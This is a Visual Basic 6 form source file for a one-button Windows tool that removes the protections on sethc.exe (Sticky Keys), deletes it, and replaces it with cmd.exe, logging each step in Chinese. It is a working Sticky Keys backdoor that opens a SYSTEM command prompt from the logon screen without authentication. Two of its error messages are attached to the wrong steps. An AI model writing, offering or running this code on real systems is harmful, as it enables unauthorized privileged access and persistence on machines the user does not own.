VERSION 5.00
Begin VB.Form Main_Form 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "cmd替换sethc"
   ClientHeight    =   2355
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   3510
   Icon            =   "Main_Form.frx":0000
   LockControls    =   -1  'True
   MaxButton       =   0   'False
   ScaleHeight     =   2355
   ScaleWidth      =   3510
   StartUpPosition =   2  '屏幕中心
   Begin VB.CommandButton Exit_Button 
      Caption         =   "退出"
      Height          =   300
      Left            =   1800
      TabIndex        =   3
      Top             =   1935
      Width           =   1590
   End
   Begin VB.CommandButton Shift_Button 
      Caption         =   "替换"
      Height          =   300
      Left            =   120
      TabIndex        =   2
      Top             =   1935
      Width           =   1575
   End
   Begin VB.TextBox Debug_Text 
      Height          =   1455
      Left            =   120
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   1
      Top             =   360
      Width           =   3270
   End
   Begin VB.Label Debug_Label 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "DEBUG:"
      Height          =   180
      Left            =   120
      TabIndex        =   0
      Top             =   90
      Width           =   540
   End
End
Attribute VB_Name = "Main_Form"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Dim IconValue As Long

Private Sub Exit_Button_Click()

On Error Resume Next

Unload Me

End Sub

Private Sub Form_Load()

On Error Resume Next

ExtractIconEx App_Path & App.EXEName & ".exe", 0, 0, IconValue, 1
SendMessageLong Me.hWnd, 128, 0, IconValue

End Sub

Private Sub Form_Unload(Cancel As Integer)

On Error Resume Next

DestroyIcon IconValue

End Sub

Private Sub Shift_Button_Click()

On Error GoTo Err1

If Debug_Text.Text <> "" Then Debug_Text.Text = Debug_Text.Text & Chr(13) & Chr(10)

Debug_Text.Text = Debug_Text.Text & "设置sethc.exe属性..." & Chr(13) & Chr(10)

SetAttr "C:\Windows\System32\sethc.exe", 0

On Error GoTo Err3

Debug_Text.Text = Debug_Text.Text & "删除sethc.exe文件..." & Chr(13) & Chr(10)

Kill "C:\Windows\System32\sethc.exe"

On Error GoTo Err2

Debug_Text.Text = Debug_Text.Text & "用cmd.exe文件替换..." & Chr(13) & Chr(10)

FileCopy "C:\Windows\System32\cmd.exe", "C:\Windows\System32\sethc.exe"

Debug_Text.Text = Debug_Text.Text & "替换全部文件完成!" & Chr(13) & Chr(10)

Exit Sub

Err1:

Debug_Text.Text = Debug_Text.Text & "设置sethc.exe属性失败" & Chr(13) & Chr(10)

Exit Sub

Err2:

Debug_Text.Text = Debug_Text.Text & "删除sethc.exe文件失败" & Chr(13) & Chr(10)

Exit Sub

Err3:

Debug_Text.Text = Debug_Text.Text & "用cmd.exe文件替换失败" & Chr(13) & Chr(10)

Exit Sub

End Sub
